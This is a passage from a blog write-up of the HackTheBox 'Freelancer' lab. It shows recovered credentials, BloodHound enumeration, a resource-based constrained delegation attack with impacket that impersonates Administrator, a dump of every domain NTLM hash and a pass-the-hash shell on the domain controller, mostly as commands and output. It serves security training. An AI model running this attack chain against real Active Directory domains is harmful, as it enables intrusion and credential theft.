   |d#09|</span><br><span class="line">============== SOFTWARE hive secrets ==============</span><br><span class="line">default_logon_user:</span><br><span class="line">default_logon_domain: TEST</span><br><span class="line">default_logon_password: None</span><br><span class="line">PS M:\py\regsecrets&gt;</span><br></pre></td></tr></table></figure></div>

<p>The credentials are: <code>lorra199:PWN3D#l0rr@Armessa199</code></p>
<p>Let’s try to perform BloodHound enumeration on the system using those creds:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Downloads]</span><br><span class="line">└─$ bloodhound-python -c ALL -u lorra199 -p <span class="string">&#x27;PWN3D#l0rr@Armessa199&#x27;</span> -d freelancer.htb -dc dc.freelancer.htb -ns  10.129.160.22 --zip</span><br><span class="line">INFO: Found AD domain: freelancer.htb</span><br><span class="line">INFO: Getting TGT <span class="keyword">for</span> user</span><br><span class="line">INFO: Connecting to LDAP server: dc.freelancer.htb</span><br><span class="line">INFO: Found 1 domains</span><br><span class="line">INFO: Found 1 domains <span class="keyword">in</span> the forest</span><br><span class="line">INFO: Found 8 computers</span><br><span class="line">INFO: Connecting to LDAP server: dc.freelancer.htb</span><br><span class="line">INFO: Found 30 <span class="built_in">users</span></span><br><span class="line">INFO: Found 58 <span class="built_in">groups</span></span><br><span class="line">INFO: Found 2 gpos</span><br><span class="line">INFO: Found 1 ous</span><br><span class="line">INFO: Found 19 containers</span><br><span class="line">INFO: Found 0 trusts</span><br><span class="line">INFO: Starting computer enumeration with 10 workers</span><br><span class="line">INFO: Querying computer: SetupMachine.freelancer.htb</span><br><span class="line">INFO: Querying computer: </span><br><span class="line">INFO: Querying computer: </span><br><span class="line">INFO: Querying computer: </span><br><span class="line">INFO: Querying computer: </span><br><span class="line">INFO: Querying computer: </span><br><span class="line">INFO: Querying computer: Datacenter-2019</span><br><span class="line">INFO: Querying computer: DC.freelancer.htb</span><br><span class="line">WARNING: Could not resolve: Datacenter-2019: The DNS operation timed out after 3.1036694049835205 seconds</span><br><span class="line">INFO: Done <span class="keyword">in</span> 00M 16S</span><br><span class="line">INFO: Compressing output into 20241005120853_bloodhound.zip</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>Now let’s also check if we could connect with lorra on the system:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Downloads]</span><br><span class="line">└─$ evil-winrm -i 10.129.160.22  -u lorra199 -p <span class="string">&#x27;PWN3D#l0rr@Armessa199&#x27;</span></span><br><span class="line">                                        </span><br><span class="line">Evil-WinRM shell v3.5</span><br><span class="line">                                        </span><br><span class="line">Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() <span class="keyword">function</span> is unimplemented on this machine</span><br><span class="line">                                        </span><br><span class="line">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm<span class="comment">#Remote-path-completion</span></span><br><span class="line">                                        </span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line">*Evil-WinRM* PS C:\Users\lorra199\Documents&gt; <span class="built_in">whoami</span></span><br><span class="line">freelancer\lorra199</span><br><span class="line">*Evil-WinRM* PS C:\Users\lorra199\Documents&gt;</span><br></pre></td></tr></table></figure></div>

<h4 id="Resource-Based-Constrained-Delegation"><a href="#Resource-Based-Constrained-Delegation" class="headerlink" title="Resource Based Constrained Delegation"></a>Resource Based Constrained Delegation</h4><p>Putting that into Bloodhound, we can see that “lorra” is a member of the <code>AD Recycle</code> Bin and has generic rights on the domain controller itself:</p>
<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/HackTheBox/Machines/Freelancer/privsec.png"
                      alt="RBCD"
                ><figcaption>RBCD</figcaption></figure><br><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/HackTheBox/Machines/Freelancer/privsec1.png"
                      alt="RBCD"
                ><figcaption>RBCD</figcaption></figure></p>
<p>Now I’m going to abuse RBCS (resource based constrained delegration) by adding a fake computer that I control to the domain. Then I can perform actions as the DC to request Kerberos tickets for my fake computer giving me the ability to impersonate other accounts, like Administrator:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ impacket-addcomputer -computer-name <span class="string">&#x27;ATTACKER$&#x27;</span> -computer-pass <span class="string">&#x27;Kujen2024!&#x27;</span> -dc-host freelancer.htb -domain-netbios freelancer.htb freelancer.htb/lorra199:<span class="string">&#x27;PWN3D#l0rr@Armessa199&#x27;</span> </span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">[*] Successfully added machine account ATTACKER$ with password Kujen2024!.</span><br></pre></td></tr></table></figure></div>
<p>This command allows the ATTACKER$ computer to delegate write authority to the DC$ computer so that it can perform specific actions:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/impacket/examples]</span><br><span class="line">└─$ python3 rbcd.py -delegate-from <span class="string">&#x27;ATTACKER$&#x27;</span> -delegate-to <span class="string">&#x27;DC$&#x27;</span> -dc-ip 10.129.160.22 -action <span class="string">&#x27;write&#x27;</span> <span class="string">&#x27;freelancer.htb/lorra199:PWN3D#l0rr@Armessa199&#x27;</span></span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty</span><br><span class="line">[*] Delegation rights modified successfully!</span><br><span class="line">[*] ATTACKER$ can now impersonate <span class="built_in">users</span> on DC$ via S4U2Proxy</span><br><span class="line">[*] Accounts allowed to act on behalf of other identity:</span><br><span class="line">[*]     ATTACKER$    (S-1-5-21-3542429192-2036945976-3483670807-12101)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>I just did sync my clock to the DC to avoid any issues:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/impacket/examples]</span><br><span class="line">└─$ sudo ntpdate -u 10.129.160.22</span><br><span class="line">2024-10-05 12:22:39.952632 (-0400) +99.756066 +/- 0.022332 10.129.160.22 s1 no-leap</span><br><span class="line">CLOCK: time stepped by 99.756066</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>Then I get service ticket for the cifs service using the Kerberos. Using this ticket, I can impersonate a specific user (aka Administrator hehe):</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/impacket/examples]</span><br><span class="line">└─$ impacket-getST -spn <span class="string">&#x27;cifs/DC.freelancer.htb&#x27;</span> -impersonate Administrator -dc-ip 10.129.160.22 <span class="string">&#x27;freelancer.htb/ATTACKER$:Kujen2024!&#x27;</span> </span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">[-] CCache file is not found. Skipping...</span><br><span class="line">[*] Getting TGT <span class="keyword">for</span> user</span><br><span class="line">[*] Impersonating Administrator</span><br><span class="line">[*] Requesting S4U2self</span><br><span class="line">[*] Requesting S4U2Proxy</span><br><span class="line">[*] Saving ticket <span class="keyword">in</span> Administrator@cifs_DC.freelancer.htb@FREELANCER.HTB.ccache</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>I can now do a secretsdump on the DC to obtain all users hashes, therefore rooting the machine:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/impacket/examples]</span><br><span class="line">└─$ <span class="built_in">export</span> KRB5CCNAME=Administrator@cifs_DC.freelancer.htb@FREELANCER.HTB.ccache</span><br><span class="line">┌──(kali㉿kali)-[~/impacket/examples]</span><br><span class="line">└─$ impacket-secretsdump <span class="string">&#x27;freelancer.htb/Administrator@DC.freelancer.htb&#x27;</span> -k -no-pass -dc-ip 10.129.146.117 -target-ip 10.129.146.117 -just-dc-ntlm</span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span><br><span class="line">[*] Using the DRSUAPI method to get NTDS.DIT secrets</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:0039318f1e8274633445bce32ad1a290:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d238e0bfa17d575038efc070187a91c2:::</span><br><span class="line">freelancer.htb\mikasaAckerman:1105:aad3b435b51404eeaad3b435b51404ee:e8d62c7d57e5d74267ab6feb2f662674:::</span><br><span class="line">sshd:1108:aad3b435b51404eeaad3b435b51404ee:c1e83616271e8e17d69391bdcd335ab4:::</span><br><span class="line">SQLBackupOperator:1112:aad3b435b51404eeaad3b435b51404ee:c4b746db703d1af5575b5c3d69f57bab:::</span><br><span class="line">sql_svc:1114:aad3b435b51404eeaad3b435b51404ee:af7b9d0557964265115d018b5cff6f8a:::</span><br><span class="line">lorra199:1116:aad3b435b51404eeaad3b435b51404ee:67d4ae78a155aab3d4aa602da518c051:::</span><br><span class="line">freelancer.htb\maya.artmes:1124:aad3b435b51404eeaad3b435b51404ee:22db50a324b9a34ea898a290c1284e25:::</span><br><span class="line">freelancer.htb\michael.williams:1126:aad3b435b51404eeaad3b435b51404ee:af7b9d0557964265115d018b5cff6f8a:::</span><br><span class="line">freelancer.htb\sdavis:1127:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::</span><br><span class="line">freelancer.htb\d.jones:1128:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::</span><br><span class="line">freelancer.htb\jen.brown:1129:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::</span><br><span class="line">freelancer.htb\taylor:1130:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::</span><br><span class="line">freelancer.htb\jmartinez:1131:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::</span><br><span class="line">freelancer.htb\olivia.garcia:1133:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::</span><br><span class="line">freelancer.htb\dthomas:1134:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::</span><br><span class="line">freelancer.htb\sophia.h:1135:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::</span><br><span class="line">freelancer.htb\Ethan.l:1138:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::</span><br><span class="line">freelancer.htb\wwalker:1141:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::</span><br><span class="line">freelancer.htb\jgreen:1142:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::</span><br><span class="line">freelancer.htb\evelyn.adams:1143:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::</span><br><span class="line">freelancer.htb\hking:1144:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::</span><br><span class="line">freelancer.htb\alex.hill:1145:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::</span><br><span class="line">freelancer.htb\samuel.turner:1146:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::</span><br><span class="line">freelancer.htb\ereed:1149:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::</span><br><span class="line">freelancer.htb\leon.sk:1151:aad3b435b51404eeaad3b435b51404ee:af7b9d0557964265115d018b5cff6f8a:::</span><br><span class="line">freelancer.htb\carol.poland:1160:aad3b435b51404eeaad3b435b51404ee:af7b9d0557964265115d018b5cff6f8a:::</span><br><span class="line">freelancer.htb\lkazanof:1162:aad3b435b51404eeaad3b435b51404ee:a26c33c2878b23df8b2da3d10e430a0f:::</span><br><span class="line">DC$:1000:aad3b435b51404eeaad3b435b51404ee:89851d57d9c8cc8addb66c59b83a4379:::</span><br><span class="line">DATACENTER-2019$:1115:aad3b435b51404eeaad3b435b51404ee:7a8b0efef4571ec55cc0b9f8cb73fdcf:::</span><br><span class="line">DATAC2-2022$:1155:aad3b435b51404eeaad3b435b51404ee:007a710c0581c63104dad1e477c794e8:::</span><br><span class="line">WS1-WIIN10$:1156:aad3b435b51404eeaad3b435b51404ee:57e57c6a3f0f8fff74e8ab524871616b:::</span><br><span class="line">WS2-WIN11$:1157:aad3b435b51404eeaad3b435b51404ee:bf5267ee6236c86a3596f72f2ddef2da:::</span><br><span class="line">WS3-WIN11$:1158:aad3b435b51404eeaad3b435b51404ee:732c190482eea7b5e6777d898e352225:::</span><br><span class="line">DC2$:1159:aad3b435b51404eeaad3b435b51404ee:e1018953ffa39b3818212aba3f736c0f:::</span><br><span class="line">SETUPMACHINE$:8601:aad3b435b51404eeaad3b435b51404ee:f5912663ecf2c8cbda2a4218127d11fe:::</span><br><span class="line">ATTACKER$:12101:aad3b435b51404eeaad3b435b51404ee:e355cdee7fcdb3cf942227dcba8bc83a:::</span><br><span class="line">[*] Cleaning up...</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/impacket/examples]</span><br><span class="line">└─$ evil-winrm -i 10.129.160.22  -u Administrator -H 0039318f1e8274633445bce32ad1a290</span><br><span class="line">                                        </span><br><span class="line">Evil-WinRM shell v3.5</span><br><span class="line">                                        </span><br><span class="line">Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() <span class="keyword">function</span> is unimplemented on this machine</span><br><span class="line">                                        </span><br><span class="line">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm<span class="comment">#Remote-path-completion</span></span><br><span class="line">                                        </span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line">*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; <span class="built_in">cat</span> ../desktop/root.txt</span><br><span class="line">b943b3e777fcf3******************</span><br><span class="line">*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>That was it for Freelancer, especially as it was my first time dealing with MemProcFS. It was so fun.<br>Thanks for reading!<br>-0xkujen</p>

        </div>

        
            <div class="post-copyright-info px-2 sm:px-6 md:px-8">
                <div class="article-copyright-info-container">
    <ul>
        <li><strong>Title:</strong> Hackthebox: Freelancer</li>
        <li><strong>Author:</strong> Foued SAIDI</li>
        <li><strong>Created at
                :</strong> 2024-10-04 17:17:18</li>
        
            <li>
                <strong>Updated at
                    :</strong> 2024-10-05 18:50:20
            </li>
        
        <li>
            <strong>Link:</strong> https://kujen5.github.io/2024/10/04/Hackthebox-Freelancer/
        </li>
        <li>
            <strong>
                License:
            </strong>
            

            
                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
            
        </li>
    </ul>
</div>

            </div>
        

        

        

        
            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
                
                    <div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
                        <a class="prev"
                        rel="prev"
                        href="/2024/10/10/Hackthebox-Blurry/"
                        >
                            <span class="left arrow-icon flex justify-center items-center">
                                <i class="fa-solid fa-chevron-left"></i>
                            </span>
                            <span class="title flex justify-center items-center">
                                <span class="post-nav-title-item">Hackthebox: Blurry</span>
                                <span class="post-nav-item">Prev posts</span>
                            </span>
                        </a>
                    </div>
                
                
                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
                        <a class="next"
                        rel="next"
                        href="/2024/09/27/Hackthebox-BoardLight/"
                        >
                            <span class="title flex justify-center items-center">
                                <span class="post-nav-title-item">Hackthebox: BoardLight</span>
                                <span class="post-nav-item">Next posts</span>
                            </span>
                            <span class="right arrow-icon flex justify-center items-center">
                                <i class="fa-solid fa-chevron-right"></i>
                            </span>
                        </a>
                    </div>
                
            </div>
        


        
    </div>

    
        <div class="toc-content-container">
            <div class="post-toc-wrap">
    <div class="post-toc">
        <div class="toc-title">On this page</div>
        <div class="page-title">Hackthebox: Freelancer</div>
        <ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#Overview"><span class="nav-text">Overview</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Reconnaissance"><span class="nav-text">Reconnaissance</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Web-Application-http-freelancer-htb"><span class="nav-text">Web Application - http:&#x2F;&#x2F;freelancer.htb&#x2F; </span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Shell-as-freelancer-sql-svc"><span class="nav-text">Shell as freelancer\sql_svc</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Privilege-Escalation-to-Administrator"><span class="nav-text">Privilege Escalation to Administrator</span></a></li></ol>

    </div>
</div>
        </div>
    
</div>



                

            </div>

            

        </div>

        <div class="main-content-footer">
            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
    <div class="info-container py-3 text-center">
        
        <div class="text-center">
            &copy;
            
              <span>2023</span>
              -
            
            2024&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Foued SAIDI</a>
        </div>
        
            <script data-swup-reload-script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
                
                    <span id="busuanzi_container_site_uv" class="lg:!block">
                        <span class="text-sm">VISITOR COUNT</span>
                        <span id="busuanzi_value_site_uv"></span>
                    </span>
                
                
                    <span id="busuanzi_container_site_pv" class="lg:!block">
                        <span class="text-sm">TOTAL PAGE VIEWS</span>
                        <span id="busuanzi_value_site_pv"></span>
                    </span>
                
            </div>
        
        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.5.2</a></span>
        </div>
        
        
            <div>
                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
            </div>
        
        
            <script data-swup-reload-script>
                try {
                    function odometer_init() {
                    const elements = document.querySelectorAll('.odometer');
                    elements.forEach(el => {
                        new Odometer({
                            el,
                            format: '( ddd).dd',
                            duration: 200
                        });
                    });
                    }
                    odometer_init();
                } catch (error) {}
            </script>
        
        
        
    </div>  
</footer>
        </div>
    </div>

    
        <div class="post-tools">
            <div class="post-tools-container">
    <ul class="article-tools-list">
        <!-- TOC aside toggle -->
        
            <li class="right-bottom-tools page-aside-toggle">
                <i class="fa-regular fa-outdent"></i>
            </li>
        

        <!-- go comment -->
        
    </ul>
</div>

        </div>
    

    <div class="right-side-tools-container">
        <div class="side-tools-container">
    <ul class="hidden-tools-list">
        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
            <i class="fa-regular fa-magnifying-glass-plus"></i>
        </li>

        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
            <i class="fa-regular fa-magnifying-glass-minus"></i>
        </li>

        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
            <i class="fa-regular fa-moon"></i>
        </li>

        <!-- rss -->
        

        

        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
            <i class="fa-regular fa-arrow-down"></i>
        </li>
    </ul>

    <ul class="visible-tools-list">
        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
            <i class="fa-regular fa-cog fa-spin"></i>
        </li>
        
            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
                <i class="arrow-up fas fa-arrow-up"></i>
                <span class="percent"></span>
            </li>
        
        
    </ul>
</div>

    </div>

    <div class="image-viewer-container">
    <img src="">
</div>


    

</main>


    
<script src="/js/libs/Swup.min.js"></script>

<script src="/js/libs/SwupSlideTheme.min.js"></script>

<script src="/js/libs/SwupScriptsPlugin.min.js"></script>

<script src="/js/libs/SwupProgressPlugin.min.js"></script>

<script src="/js/libs/SwupScrollPlugin.min.js"></script>

<script src="/js/libs/SwupPreloadPlugin.min.js"></script>

<script>
    const swup = new Swup({
        plugins: [
            new SwupScriptsPlugin({
                optin: true,
            }),
            new SwupProgressPlugin(),
            new SwupScrollPlugin({
                offset: 80,
            }),
            new SwupSlideTheme({
                mainElement: ".main-content-body",
            }),
            new SwupPreloadPlugin(),
        ],
        containers: ["#swup"],
    });
</script>







<script src="/js/tools/imageViewer.js" type="module"></script>

<script src="/js/utils.js" type="module"></script>

<script src="/js/main.js" type="module"></script>

<script src="/js/layouts/navbarShrink.js" type="module"></script>

<script src="/js/tools/scrollTopBottom.js" type="module"></script>

<script src="/js/tools/lightDarkSwitch.js" type="module"></script>

<script src="/js/layouts/categoryList.js" type="module"></script>





    
<script src="/js/tools/codeBlock.js" type="module"></script>




    
<script src="/js/layouts/lazyload.js" type="module"></script>




    
<script src="/js/tools/runtime.js"></script>

    
<script src="/js/libs/odometer.min.js"></script>

    
<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">




  
<script src="/js/libs/Typed.min.js"></script>

  
<script src="/js/plugins/typed.js" type="module"></script>







<div class="post-scripts" data-swup-reload-script>
    
        
<script src="/js/libs/anime.min.js"></script>

        
<script src="/js/tools/tocToggle.js" type="module"></script>

<script src="/js/layouts/toc.js" type="module"></script>

<script src="/js/plugins/tabs.js" type="module"></script>

    
</div>


</body>
</html>
